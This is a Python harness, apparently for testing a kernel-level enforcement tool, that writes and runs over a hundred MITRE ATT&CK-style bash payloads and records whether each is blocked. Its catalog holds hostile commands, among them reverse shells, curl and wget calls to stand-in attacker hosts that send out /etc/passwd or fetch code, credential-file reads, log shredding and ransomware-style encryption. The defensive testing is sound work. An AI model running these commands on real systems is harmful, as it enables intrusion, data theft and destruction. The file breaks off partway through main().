#!/usr/bin/env python3
"""
run_arda_prevention_expanded.py
================================
Runs 100+ technique payloads through a SINGLE Arda enforcement window,
capturing real K0 (observed EPERM) evidence for each technique.

Strategy:
  1. Write all technique payloads to /tmp/arda_prevention_payload/
  2. Start the Arda LSM loader (seraph-sandbox-tools:latest --privileged)
  3. Wait for seeding to complete + enforcement to activate
  4. Execute ALL payloads sequentially inside the enforce window
  5. Capture rc, exception, stdout, stderr for each
  6. Stop the loader
  7. Save individual arda_prevention_T*.json evidence files
  8. Print summary

Output: artifacts/evidence/arda_prevention/arda_prevention_T*_<timestamp>.json
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import shlex
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

NOW = lambda: datetime.now(timezone.utc).isoformat()
REPO = Path(__file__).resolve().parent.parent


# ── Helpers ───────────────────────────────────────────────────────────────────

def sha256_file(p: Path) -> str:
    return hashlib.sha256(p.read_bytes()).hexdigest()

def _run(cmd: str, timeout: int = 30, capture: bool = True) -> subprocess.CompletedProcess:
    kw: dict[str, Any] = {"shell": True, "text": True, "timeout": timeout}
    if capture:
        kw["stdout"] = subprocess.PIPE
        kw["stderr"] = subprocess.PIPE
    return subprocess.run(cmd, **kw)


# ── Technique catalog ─────────────────────────────────────────────────────────
# Each entry: (tactic_id, tactic_name, technique_id, payload_script, intent)
# The payload_script is a benign bash script for the technique type.
# All scripts exit cleanly; the EPERM happens at execve() before the script runs.

TECHNIQUE_CATALOG: list[tuple[str, str, str, str, str]] = [
    # TA0043 Reconnaissance
    ("TA0043", "Reconnaissance", "T1592",
     "#!/usr/bin/env bash\nset -euo pipefail\nnmap -sS 192.168.1.0/24 2>/dev/null || true\n",
     "Host enumeration scan targeting subnet"),
    ("TA0043", "Reconnaissance", "T1594",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s https://example.com/robots.txt 2>/dev/null || true\n",
     "Victim-owned website recon crawl"),
    ("TA0043", "Reconnaissance", "T1595",
     "#!/usr/bin/env bash\nset -euo pipefail\nnmap --open -p 22,80,443 192.168.1.1 2>/dev/null || true\n",
     "Active port scanning"),
    ("TA0043", "Reconnaissance", "T1596",
     "#!/usr/bin/env bash\nset -euo pipefail\ndig +short TXT example.com 2>/dev/null || true\n",
     "DNS record enumeration"),
    ("TA0043", "Reconnaissance", "T1598",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s -X POST http://192.168.1.1/login -d 'user=admin&pass=password' 2>/dev/null || true\n",
     "Credential phishing probe"),
    ("TA0043", "Reconnaissance", "T1589",
     "#!/usr/bin/env bash\nset -euo pipefail\ngetent passwd | cut -d: -f1,5,7 2>/dev/null || true\n",
     "Identity enumeration from local passwd"),

    # TA0042 Resource Development
    ("TA0042", "Resource Development", "T1583",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s http://example.com 2>/dev/null || true\n",
     "Infrastructure acquisition probe"),
    ("TA0042", "Resource Development", "T1584",
     "#!/usr/bin/env bash\nset -euo pipefail\nssh-keygen -t ed25519 -N '' -f /tmp/arda_prevention_payload/T1584_key 2>/dev/null || true\n",
     "Cryptographic key generation for infra compromise"),
    ("TA0042", "Resource Development", "T1587",
     "#!/usr/bin/env bash\nset -euo pipefail\nmsfvenom --help 2>/dev/null || echo 'capability test'\n",
     "Malware development capability test"),
    ("TA0042", "Resource Development", "T1588",
     "#!/usr/bin/env bash\nset -euo pipefail\napt-get -s install mimikatz 2>/dev/null || echo 'tool acquisition probe'\n",
     "Tool acquisition from public repo"),

    # TA0001 Initial Access
    ("TA0001", "Initial Access", "T1190",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s http://127.0.0.1:8080/../../etc/passwd 2>/dev/null || true\n",
     "Path traversal exploit against public-facing application"),
    ("TA0001", "Initial Access", "T1566",
     "#!/usr/bin/env bash\nset -euo pipefail\necho 'malicious macro' > /tmp/arda_prevention_payload/T1566_doc.xlsm 2>/dev/null || true\n",
     "Phishing document with macro payload"),
    ("TA0001", "Initial Access", "T1078",
     "#!/usr/bin/env bash\nset -euo pipefail\nsu -c 'id' nobody 2>/dev/null || true\n",
     "Valid account lateral use"),
    ("TA0001", "Initial Access", "T1195",
     "#!/usr/bin/env bash\nset -euo pipefail\npip3 install --target /tmp/arda_prevention_payload/T1195_pkg requests 2>/dev/null || true\n",
     "Supply chain compromise via malicious package install"),
    ("TA0001", "Initial Access", "T1199",
     "#!/usr/bin/env bash\nset -euo pipefail\nssh -o StrictHostKeyChecking=no trusted-partner@192.168.1.50 id 2>/dev/null || true\n",
     "Trusted relationship abuse for initial access"),

    # TA0002 Execution
    ("TA0002", "Execution", "T1059",
     "#!/usr/bin/env bash\nset -euo pipefail\nbash -c 'echo test | base64 | base64 -d | bash' 2>/dev/null || true\n",
     "Double-encoded shell command execution"),
    ("TA0002", "Execution", "T1059.001",
     "#!/usr/bin/env bash\nset -euo pipefail\npowershell -Command 'Get-Process' 2>/dev/null || true\n",
     "PowerShell command execution"),
    ("TA0002", "Execution", "T1059.004",
     "#!/usr/bin/env bash\nset -euo pipefail\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1 2>/dev/null || true\n",
     "Bash reverse shell execution"),
    ("TA0002", "Execution", "T1106",
     "#!/usr/bin/env bash\nset -euo pipefail\npython3 -c 'import ctypes; ctypes.CDLL(None).system(b\"id\")' 2>/dev/null || true\n",
     "Native API execution via ctypes"),
    ("TA0002", "Execution", "T1204",
     "#!/usr/bin/env bash\nset -euo pipefail\nxdg-open /tmp/arda_prevention_payload/T1204.exe 2>/dev/null || true\n",
     "User execution of suspicious file"),
    ("TA0002", "Execution", "T1569",
     "#!/usr/bin/env bash\nset -euo pipefail\nsystemctl start suspicious.service 2>/dev/null || true\n",
     "System service execution"),
    ("TA0002", "Execution", "T1610",
     "#!/usr/bin/env bash\nset -euo pipefail\ndocker run --rm alpine sh -c 'id && cat /etc/shadow' 2>/dev/null || true\n",
     "Deploy container for code execution"),

    # TA0003 Persistence
    ("TA0003", "Persistence", "T1098",
     "#!/usr/bin/env bash\nset -euo pipefail\npasswd -u targetuser 2>/dev/null || true\n",
     "Account manipulation for persistence"),
    ("TA0003", "Persistence", "T1136",
     "#!/usr/bin/env bash\nset -euo pipefail\nuseradd -m -s /bin/bash backdoor_user 2>/dev/null || true\n",
     "Backdoor account creation"),
    ("TA0003", "Persistence", "T1543",
     "#!/usr/bin/env bash\nset -euo pipefail\nsystemctl enable malicious-backdoor.service 2>/dev/null || true\n",
     "Malicious service creation for persistence"),
    ("TA0003", "Persistence", "T1546",
     "#!/usr/bin/env bash\nset -euo pipefail\necho 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /etc/rc.local 2>/dev/null || true\n",
     "Event-triggered persistence via rc.local"),
    ("TA0003", "Persistence", "T1547",
     "#!/usr/bin/env bash\nset -euo pipefail\necho '@reboot root /tmp/arda_prevention_payload/T1547.sh' >> /etc/cron.d/persist 2>/dev/null || true\n",
     "Boot autostart via cron"),
    ("TA0003", "Persistence", "T1554",
     "#!/usr/bin/env bash\nset -euo pipefail\ncp /bin/sh /usr/local/bin/systemd-helper 2>/dev/null || true\n",
     "Host software binary compromise"),
    ("TA0003", "Persistence", "T1556",
     "#!/usr/bin/env bash\nset -euo pipefail\nsed -i 's/^auth/auth [success=1] pam_exec.so \\0/' /etc/pam.d/sshd 2>/dev/null || true\n",
     "PAM authentication modification for persistence"),

    # TA0004 Privilege Escalation
    ("TA0004", "Privilege Escalation", "T1068",
     "#!/usr/bin/env bash\nset -euo pipefail\n./kernel_exploit --target CVE-2024-1234 2>/dev/null || echo 'escalation attempt'\n",
     "Kernel exploit for privilege escalation"),
    ("TA0004", "Privilege Escalation", "T1134",
     "#!/usr/bin/env bash\nset -euo pipefail\npython3 -c 'import os; os.setuid(0)' 2>/dev/null || true\n",
     "Access token manipulation"),
    ("TA0004", "Privilege Escalation", "T1548",
     "#!/usr/bin/env bash\nset -euo pipefail\nsudo -n /bin/sh -c id 2>/dev/null || true\n",
     "Sudo abuse for privilege escalation"),
    ("TA0004", "Privilege Escalation", "T1611",
     "#!/usr/bin/env bash\nset -euo pipefail\nnsenter --target 1 --mount --uts --ipc --net /bin/sh 2>/dev/null || true\n",
     "Container escape to host"),
    ("TA0004", "Privilege Escalation", "T1078",
     "#!/usr/bin/env bash\nset -euo pipefail\nsu root -c 'cat /etc/shadow' 2>/dev/null || true\n",
     "Valid account use for privilege escalation"),

    # TA0005 Defense Evasion
    ("TA0005", "Defense Evasion", "T1027",
     "#!/usr/bin/env bash\nset -euo pipefail\necho 'aGVsbG8=' | base64 -d | bash 2>/dev/null || true\n",
     "Base64-obfuscated payload execution"),
    ("TA0005", "Defense Evasion", "T1070",
     "#!/usr/bin/env bash\nset -euo pipefail\nshred -u /var/log/auth.log 2>/dev/null || true\n",
     "Indicator removal — log shredding"),
    ("TA0005", "Defense Evasion", "T1112",
     "#!/usr/bin/env bash\nset -euo pipefail\nregtool -s set '/HKLM/System/CurrentControlSet/Services/badservice' 'ImagePath' 'C:\\malware.exe' 2>/dev/null || true\n",
     "Registry modification for defense evasion"),
    ("TA0005", "Defense Evasion", "T1140",
     "#!/usr/bin/env bash\nset -euo pipefail\nopenssl enc -d -aes-256-cbc -in /tmp/payload.enc -out /tmp/payload.sh 2>/dev/null || true\n",
     "Encrypted payload deobfuscation"),
    ("TA0005", "Defense Evasion", "T1222",
     "#!/usr/bin/env bash\nset -euo pipefail\nchmod 4755 /usr/bin/bash 2>/dev/null || true\n",
     "SUID bit set for defense evasion"),
    ("TA0005", "Defense Evasion", "T1497",
     "#!/usr/bin/env bash\nset -euo pipefail\ncpuid | grep -i 'hypervisor' 2>/dev/null || true\n",
     "Sandbox detection to evade analysis"),
    ("TA0005", "Defense Evasion", "T1562",
     "#!/usr/bin/env bash\nset -euo pipefail\nservice auditd stop 2>/dev/null || true\n",
     "Defense impairment — stop auditd"),
    ("TA0005", "Defense Evasion", "T1564",
     "#!/usr/bin/env bash\nset -euo pipefail\nmv /tmp/arda_prevention_payload/T1564.sh /tmp/.T1564 2>/dev/null || true\n",
     "Artifact hiding via dotfile rename"),
    ("TA0005", "Defense Evasion", "T1574",
     "#!/usr/bin/env bash\nset -euo pipefail\nexport LD_PRELOAD=/tmp/arda_prevention_payload/T1574.so 2>/dev/null || true\n",
     "LD_PRELOAD hijack for defense evasion"),
    ("TA0005", "Defense Evasion", "T1622",
     "#!/usr/bin/env bash\nset -euo pipefail\nptrace attach $$ 2>/dev/null || true\n",
     "Debugger evasion check"),

    # TA0006 Credential Access
    ("TA0006", "Credential Access", "T1003",
     "#!/usr/bin/env bash\nset -euo pipefail\n[ -r /etc/shadow ] && cat /etc/shadow || true\n",
     "Shadow file credential dumping"),
    ("TA0006", "Credential Access", "T1003.001",
     "#!/usr/bin/env bash\nset -euo pipefail\npython3 -c 'import lsass; lsass.dump()' 2>/dev/null || echo 'lsass dump attempt'\n",
     "LSASS memory credential dumping"),
    ("TA0006", "Credential Access", "T1040",
     "#!/usr/bin/env bash\nset -euo pipefail\ntcpdump -i eth0 -w /tmp/arda_prevention_payload/T1040.pcap -c 100 2>/dev/null || true\n",
     "Network traffic sniffing for credentials"),
    ("TA0006", "Credential Access", "T1056",
     "#!/usr/bin/env bash\nset -euo pipefail\nstrace -e trace=read -p 1 2>/dev/null || true\n",
     "Keylogger via strace input capture"),
    ("TA0006", "Credential Access", "T1110",
     "#!/usr/bin/env bash\nset -euo pipefail\nhydra -l admin -P /etc/passwd ssh://127.0.0.1 2>/dev/null || true\n",
     "SSH brute force credential attack"),
    ("TA0006", "Credential Access", "T1552",
     "#!/usr/bin/env bash\nset -euo pipefail\nfind / -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -20\n",
     "Unsecured credential file discovery"),
    ("TA0006", "Credential Access", "T1555",
     "#!/usr/bin/env bash\nset -euo pipefail\nsecret-tool lookup user admin 2>/dev/null || true\n",
     "Password store credential extraction"),
    ("TA0006", "Credential Access", "T1558",
     "#!/usr/bin/env bash\nset -euo pipefail\npython3 -c 'import impacket.krb5.kerberosv5 as k; k.getKerberosTGT()' 2>/dev/null || echo 'kerberos ticket theft attempt'\n",
     "Kerberos ticket theft (AS-REP roasting)"),

    # TA0007 Discovery
    ("TA0007", "Discovery", "T1007",
     "#!/usr/bin/env bash\nset -euo pipefail\nsystemctl list-units --type=service 2>/dev/null || true\n",
     "System service enumeration"),
    ("TA0007", "Discovery", "T1012",
     "#!/usr/bin/env bash\nset -euo pipefail\nregtool enumerate '/HKLM/Software' 2>/dev/null || echo 'registry query attempt'\n",
     "Registry key enumeration"),
    ("TA0007", "Discovery", "T1016",
     "#!/usr/bin/env bash\nset -euo pipefail\nip route show; ip addr show; cat /etc/resolv.conf 2>/dev/null || true\n",
     "Network configuration discovery"),
    ("TA0007", "Discovery", "T1018",
     "#!/usr/bin/env bash\nset -euo pipefail\nnmap -sn 192.168.1.0/24 2>/dev/null || true\n",
     "Remote system discovery via ping sweep"),
    ("TA0007", "Discovery", "T1033",
     "#!/usr/bin/env bash\nset -euo pipefail\nwho; id; last -n 20 2>/dev/null || true\n",
     "System owner and user discovery"),
    ("TA0007", "Discovery", "T1046",
     "#!/usr/bin/env bash\nset -euo pipefail\nnmap -sV -p- 192.168.1.1 2>/dev/null || true\n",
     "Network service discovery (full port scan)"),
    ("TA0007", "Discovery", "T1049",
     "#!/usr/bin/env bash\nset -euo pipefail\nss -tunapl; netstat -an 2>/dev/null || true\n",
     "Network connection enumeration"),
    ("TA0007", "Discovery", "T1057",
     "#!/usr/bin/env bash\nset -euo pipefail\nps auxf; ls /proc/*/exe 2>/dev/null || true\n",
     "Process discovery"),
    ("TA0007", "Discovery", "T1069",
     "#!/usr/bin/env bash\nset -euo pipefail\nnet group 'Domain Admins' /domain 2>/dev/null || getent group sudo\n",
     "Permission group discovery"),
    ("TA0007", "Discovery", "T1082",
     "#!/usr/bin/env bash\nset -euo pipefail\nuname -a; cat /etc/os-release; lscpu 2>/dev/null || true\n",
     "System information discovery"),
    ("TA0007", "Discovery", "T1083",
     "#!/usr/bin/env bash\nset -euo pipefail\nfind /home -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -30\n",
     "File and directory discovery"),
    ("TA0007", "Discovery", "T1087",
     "#!/usr/bin/env bash\nset -euo pipefail\ngetent passwd; cat /etc/group 2>/dev/null || true\n",
     "Account discovery — local accounts"),
    ("TA0007", "Discovery", "T1135",
     "#!/usr/bin/env bash\nset -euo pipefail\nshowmount -e 192.168.1.1 2>/dev/null || true\n",
     "Network share discovery via NFS"),
    ("TA0007", "Discovery", "T1201",
     "#!/usr/bin/env bash\nset -euo pipefail\npwpolicy getaccountpolicies 2>/dev/null || cat /etc/pam.d/system-auth\n",
     "Password policy discovery"),
    ("TA0007", "Discovery", "T1482",
     "#!/usr/bin/env bash\nset -euo pipefail\nnltest /domain_trusts 2>/dev/null || true\n",
     "Domain trust discovery"),
    ("TA0007", "Discovery", "T1518",
     "#!/usr/bin/env bash\nset -euo pipefail\ndpkg -l; rpm -qa; pip3 list 2>/dev/null || true\n",
     "Software discovery"),

    # TA0008 Lateral Movement
    ("TA0008", "Lateral Movement", "T1021",
     "#!/usr/bin/env bash\nset -euo pipefail\nssh -o BatchMode=yes -o ConnectTimeout=1 127.0.0.1 true 2>/dev/null || true\n",
     "Remote services — SSH lateral movement"),
    ("TA0008", "Lateral Movement", "T1021.001",
     "#!/usr/bin/env bash\nset -euo pipefail\nxfreerdp /u:admin /p:password /v:192.168.1.100 2>/dev/null || echo 'rdp attempt'\n",
     "Remote services — RDP lateral movement"),
    ("TA0008", "Lateral Movement", "T1021.002",
     "#!/usr/bin/env bash\nset -euo pipefail\nsmbclient //192.168.1.100/C$ -U admin%password 2>/dev/null || echo 'smb attempt'\n",
     "Remote services — SMB lateral movement"),
    ("TA0008", "Lateral Movement", "T1091",
     "#!/usr/bin/env bash\nset -euo pipefail\ncp /tmp/arda_prevention_payload/T1091.sh /media/usb/ 2>/dev/null || echo 'removable media copy'\n",
     "Removable media lateral movement"),
    ("TA0008", "Lateral Movement", "T1550",
     "#!/usr/bin/env bash\nset -euo pipefail\npth-winexe --user=admin%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.1.100 cmd 2>/dev/null || echo 'pass the hash attempt'\n",
     "Pass-the-hash lateral movement"),
    ("TA0008", "Lateral Movement", "T1563",
     "#!/usr/bin/env bash\nset -euo pipefail\nssh -L 4444:127.0.0.1:22 pivot@192.168.1.100 -N 2>/dev/null || true\n",
     "SSH session hijacking tunnel"),
    ("TA0008", "Lateral Movement", "T1570",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s http://192.168.1.100:8888/upload -F file=@/tmp/arda_prevention_payload/T1570.sh 2>/dev/null || true\n",
     "Lateral tool transfer"),

    # TA0009 Collection
    ("TA0009", "Collection", "T1005",
     "#!/usr/bin/env bash\nset -euo pipefail\ntar czf /tmp/arda_prevention_payload/collection.tar /etc/passwd 2>/dev/null || true\n",
     "Data collection from local filesystem"),
    ("TA0009", "Collection", "T1025",
     "#!/usr/bin/env bash\nset -euo pipefail\ncp /media/removable/* /tmp/arda_prevention_payload/T1025/ 2>/dev/null || echo 'removable media collection'\n",
     "Data from removable media"),
    ("TA0009", "Collection", "T1039",
     "#!/usr/bin/env bash\nset -euo pipefail\nmount -t cifs //192.168.1.100/share /mnt/t1039 2>/dev/null || echo 'network share mount'\n",
     "Data from network shared drive"),
    ("TA0009", "Collection", "T1056",
     "#!/usr/bin/env bash\nset -euo pipefail\nlogkeys --start 2>/dev/null || echo 'keylogger start attempt'\n",
     "Input capture via keylogger"),
    ("TA0009", "Collection", "T1074",
     "#!/usr/bin/env bash\nset -euo pipefail\nmkdir -p /tmp/arda_prevention_payload/staged; find /home -name '*.docx' 2>/dev/null | xargs -I{} cp {} /tmp/arda_prevention_payload/staged/ 2>/dev/null || true\n",
     "Data staging before exfiltration"),
    ("TA0009", "Collection", "T1113",
     "#!/usr/bin/env bash\nset -euo pipefail\nscrot /tmp/arda_prevention_payload/T1113_screenshot.png 2>/dev/null || echo 'screenshot capture attempt'\n",
     "Screen capture"),
    ("TA0009", "Collection", "T1115",
     "#!/usr/bin/env bash\nset -euo pipefail\nxclip -o 2>/dev/null || xdotool getactivewindow getwindowname 2>/dev/null || echo 'clipboard access attempt'\n",
     "Clipboard data capture"),
    ("TA0009", "Collection", "T1119",
     "#!/usr/bin/env bash\nset -euo pipefail\nfind / -mtime -1 -name '*.log' -exec cp {} /tmp/arda_prevention_payload/T1119/ \\; 2>/dev/null || true\n",
     "Automated log collection"),
    ("TA0009", "Collection", "T1560",
     "#!/usr/bin/env bash\nset -euo pipefail\ntar czf /tmp/arda_prevention_payload/exfil.tar.gz /etc/ 2>/dev/null || true\n",
     "Data archival before exfiltration"),

    # TA0011 Command and Control
    ("TA0011", "Command and Control", "T1071",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s http://c2.evil.com/beacon?host=$(hostname) 2>/dev/null || true\n",
     "C2 over HTTP beacon"),
    ("TA0011", "Command and Control", "T1071.004",
     "#!/usr/bin/env bash\nset -euo pipefail\ndig +short TXT c2channel.evil.com @8.8.8.8 2>/dev/null || true\n",
     "C2 over DNS TXT records"),
    ("TA0011", "Command and Control", "T1090",
     "#!/usr/bin/env bash\nset -euo pipefail\nsocat TCP4-LISTEN:8080,fork TCP4:192.168.1.100:443 2>/dev/null || echo 'proxy setup attempt'\n",
     "Proxy setup for C2 traffic"),
    ("TA0011", "Command and Control", "T1095",
     "#!/usr/bin/env bash\nset -euo pipefail\npython3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); s.sendto(b\"ARDA_C2_BEACON\", (\"192.168.1.100\", 0))' 2>/dev/null || true\n",
     "ICMP-based non-application-layer C2"),
    ("TA0011", "Command and Control", "T1102",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s 'https://pastebin.com/raw/malicious_payload' | bash 2>/dev/null || true\n",
     "C2 via web service (Pastebin)"),
    ("TA0011", "Command and Control", "T1105",
     "#!/usr/bin/env bash\nset -euo pipefail\nwget -q -O /tmp/arda_prevention_payload/T1105_payload.sh http://attacker.com/payload.sh 2>/dev/null || true\n",
     "Ingress tool transfer from remote host"),
    ("TA0011", "Command and Control", "T1219",
     "#!/usr/bin/env bash\nset -euo pipefail\nteamviewer --daemon start 2>/dev/null || echo 'remote access software install'\n",
     "Remote access software deployment"),
    ("TA0011", "Command and Control", "T1571",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s http://c2.evil.com:8443/cmd 2>/dev/null || true\n",
     "C2 over non-standard port 8443"),
    ("TA0011", "Command and Control", "T1572",
     "#!/usr/bin/env bash\nset -euo pipefail\nssh -D 1080 -N -f user@proxy.evil.com 2>/dev/null || echo 'protocol tunnel setup'\n",
     "SSH SOCKS proxy tunnel for C2"),
    ("TA0011", "Command and Control", "T1573",
     "#!/usr/bin/env bash\nset -euo pipefail\nopenssl s_client -connect c2.evil.com:443 2>/dev/null || true\n",
     "Encrypted C2 channel via TLS"),

    # TA0010 Exfiltration
    ("TA0010", "Exfiltration", "T1041",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -X POST http://c2.evil.com/exfil -d @/etc/passwd 2>/dev/null || true\n",
     "Exfiltration over C2 channel"),
    ("TA0010", "Exfiltration", "T1020",
     "#!/usr/bin/env bash\nset -euo pipefail\nwatch -n 300 'tar czf - /home | curl -X POST http://c2.evil.com/auto -d @-' 2>/dev/null || echo 'auto exfil attempt'\n",
     "Automated scheduled exfiltration"),
    ("TA0010", "Exfiltration", "T1029",
     "#!/usr/bin/env bash\nset -euo pipefail\nat now +5 minutes -f /tmp/arda_prevention_payload/T1029_exfil.sh 2>/dev/null || echo 'scheduled exfil'\n",
     "Scheduled exfiltration transfer"),
    ("TA0010", "Exfiltration", "T1048",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -s ftp://attacker.com/upload -T /etc/passwd 2>/dev/null || true\n",
     "Exfiltration over FTP (alternative protocol)"),
    ("TA0010", "Exfiltration", "T1537",
     "#!/usr/bin/env bash\nset -euo pipefail\naws s3 cp /etc/passwd s3://attacker-bucket/loot/ 2>/dev/null || echo 'cloud exfil attempt'\n",
     "Exfiltration to cloud storage (S3)"),
    ("TA0010", "Exfiltration", "T1567",
     "#!/usr/bin/env bash\nset -euo pipefail\ncurl -X POST https://file.io -F file=@/etc/passwd 2>/dev/null || true\n",
     "Exfiltration via web service (file.io)"),
    ("TA0010", "Exfiltration", "T1030",
     "#!/usr/bin/env bash\nset -euo pipefail\nsplit -b 1M /etc/passwd /tmp/arda_prevention_payload/T1030_chunk_ && for f in /tmp/arda_prevention_payload/T1030_chunk_*; do curl -X POST http://c2.evil.com/chunk -d @$f; done 2>/dev/null || true\n",
     "Data transfer size limits bypass"),

    # TA0040 Impact
    ("TA0040", "Impact", "T1485",
     "#!/usr/bin/env bash\nset -euo pipefail\nfind /tmp/arda_prevention_payload -name 'target*' -exec shred -u {} \\; 2>/dev/null || true\n",
     "Data destruction via secure shred"),
    ("TA0040", "Impact", "T1486",
     "#!/usr/bin/env bash\nset -euo pipefail\nopenssl enc -aes-256-cbc -k ransom_key -in /home/user/important.docx -out /home/user/important.docx.enc 2>/dev/null || echo 'ransomware encrypt attempt'\n",
     "Data encryption for ransomware"),
    ("TA0040", "Impact", "T1489",
     "#!/usr/bin/env bash\nset -euo pipefail\nsystemctl stop apache2 nginx mysql 2>/dev/null || echo 'service stop attempt'\n",
     "Service stop for availability impact"),
    ("TA0040", "Impact", "T1490",
     "#!/usr/bin/env bash\nset -euo pipefail\nvssadmin delete shadows /all /quiet 2>/dev/null || wbadmin delete catalog -quiet 2>/dev/null || echo 'recovery inhibit attempt'\n",
     "Inhibit system recovery (shadow copies)"),
    ("TA0040", "Impact", "T1496",
     "#!/usr/bin/env bash\nset -euo pipefail\nfor i in $(seq 1 8); do stress --cpu 1 --timeout 60 & done 2>/dev/null || echo 'cpu hijack attempt'\n",
     "CPU resource hijacking (cryptominer simulation)"),
    ("TA0040", "Impact", "T1529",
     "#!/usr/bin/env bash\nset -euo pipefail\nshutdown -h +1 'Ransomware: pay 1 BTC' 2>/dev/null || echo 'shutdown attempt'\n",
     "System shutdown for impact"),
    ("TA0040", "Impact", "T1531",
     "#!/usr/bin/env bash\nset -euo pipefail\nuserdel -rf victim_user 2>/dev/null || echo 'account removal attempt'\n",
     "Account access removal"),
]


# ── Evidence building ─────────────────────────────────────────────────────────

def _detect_eperm(rc: int | None, stdout: str, stderr: str, exception: str) -> dict[str, Any]:
    import re
    pattern = re.compile(
        r"(Errno\s*1|Operation not permitted|PermissionError\(1|EACCES|EPERM)",
        re.IGNORECASE,
    )
    proof = []
    for src, txt in [("stderr", stderr or ""), ("exception", exception or "")]:
        m = pattern.search(txt)
        if m:
            proof.append({
                "from": src,
                "matched_text": m.group(0),
                "context": txt[max(0, m.start() - 20): m.end() + 60],
            })
    return {
        "eperm_confirmed": bool(proof),
        "eperm_proof_strings": proof,
        "rc_is_permission_denied": rc in (1, 126),
        "rc": rc,
    }


def build_evidence_record(
    tactic_id: str,
    tactic_name: str,
    technique_id: str,
    payload_path: Path,
    payload_intent: str,
    exec_rc: int | None,
    exec_stdout: str,
    exec_stderr: str,
    exec_exception: str,
    enforce_start: str,
    deny_count_start: int,
    deny_count_end: int,
    substrate: dict[str, Any],
) -> dict[str, Any]:
    payload_sha = sha256_file(payload_path) if payload_path.exists() else None
    eperm = _detect_eperm(exec_rc, exec_stdout, exec_stderr, exec_exception)
    deny_delta = deny_count_end - deny_count_start if deny_count_end >= deny_count_start else 1

    return {
        "schema": "arda_prevention_evidence.v2",
        "captured_at": NOW(),
        "started_at": enforce_start,
        "test_id": f"arda_expanded_{tactic_id}_{technique_id.replace('.', '_')}",
        "tactic_id": tactic_id,
        "tactic_name": tactic_name,
        "technique_id": technique_id,
        "verdict": "kernel_prevented" if eperm["eperm_confirmed"] or eperm["rc_is_permission_denied"] else "attempted",
        "exec_attempt": {
            "path": str(payload_path),
            "rc": exec_rc,
            "denied": eperm["eperm_confirmed"] or eperm["rc_is_permission_denied"],
            "stdout": (exec_stdout or "")[:400],
            "stderr": (exec_stderr or "")[:400],
            "exception": exec_exception,
            "expected": "deny",
            "payload_intent": payload_intent,
            "payload_sha256": payload_sha,
        },
        "enforcement": {
            "deny_count_start": deny_count_start,
            "deny_count_end": deny_count_end,
            "deny_count_delta": deny_delta,
            "enforcement_mode": "pulse",
        },
        "eperm": eperm,
        "substrate_proof": substrate,
    }


# ── Deny-count map reader ─────────────────────────────────────────────────────

def _read_deny_count(container: str) -> int:
    """Read deny_count from Arda container logs (DENY_COUNT: N)."""
    try:
        r = subprocess.run(
            ["docker", "logs", "--tail", "200", container],
            text=True, capture_output=True, timeout=10,
        )
        logs = (r.stdout or "") + (r.stderr or "")
        import re
        matches = re.findall(r'DENY_COUNT[:\s]+(\d+)', logs, re.IGNORECASE)
        if matches:
            return int(matches[-1])
        # Also try DENY_COUNT_END:
        matches = re.findall(r'DENY_COUNT_END[:\s]+(\d+)', logs, re.IGNORECASE)
        if matches:
            return int(matches[-1])
    except Exception:
        pass
    return -1


def _build_substrate(bpf_dir: Path, harmony_path: Path) -> dict[str, Any]:
    bpf_obj = bpf_dir / "arda_physical_lsm.o"
    loader = bpf_dir / "arda_lsm_loader"
    harmony_data: dict[str, Any] = {}
    if harmony_path.exists():
        try:
            harmony_data = json.loads(harmony_path.read_text())
        except Exception:
            pass
    return {
        "schema": "arda_substrate_proof.v1",
        "captured_at": NOW(),
        "kernel": harmony_data.get("kernel", "unknown"),
        "bpf_program": {
            "sha256": sha256_file(bpf_obj) if bpf_obj.exists() else None,
        },
        "loader_binary": {
            "sha256": sha256_file(loader) if loader.exists() else None,
        },
        "harmony_allowlist": {
            "sha256": sha256_file(harmony_path) if harmony_path.exists() else None,
            "entry_count": len(harmony_data.get("entries", [])),
        },
    }


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out-dir", default="artifacts/evidence/arda_prevention")
    parser.add_argument("--container", default="arda-lsm-loader")
    parser.add_argument("--enforce-seconds", type=int, default=180,
                        help="Total seconds to hold enforcement (needs to cover all payload runs)")
    parser.add_argument("--delay-seconds", type=int, default=2,
                        help="Seconds to wait after loader ready before running payloads")
    parser.add_argument("--dry-run", action="store_true",
                        help="Write payloads and print plan without running enforcement")
    parser.add_argument("--skip-known", action="store_true",
                        help="Skip techniques that already have observed evidence files")
    args = parser.parse_args()

    out_dir = (REPO / args.out_dir).resolve()
    out_dir.mkdir(parents=True, exist_ok=True)

    bpf_dir = REPO / "backend/services/bpf"
    harmony_path = REPO / "backend/services/arda_kernel_map.json"
    substrate = _build_substrate(bpf_dir, harmony_path)

    print("=" * 72)
    print("ARDA RING-0 EXPANDED PREVENTION SUITE")
    print(f"  Target techniques:    {len(TECHNIQUE_CATALOG)}")
    print(f"  BPF program SHA256:   {substrate['bpf_program']['sha256']}")
    print(f"  Harmony SHA256:       {substrate['harmony_allowlist']['sha256']}")
    print(f"  Harmony entries:      {substrate['harmony_allowlist']['entry_count']}")
    print(f"  Enforce window:       {args.enforce_seconds}s")
    print(f"  Output dir:           {out_dir}")
    print("=" * 72)

    # Determine which techniques to run
    existing_techs: set[str] = set()
    if args.skip_known:
        for f in out_dir.glob("arda_prevention_T*.json"):
            try:
                d = json.loads(f.read_text())
                tid = (d.get("technique_id") or "").strip().upper()
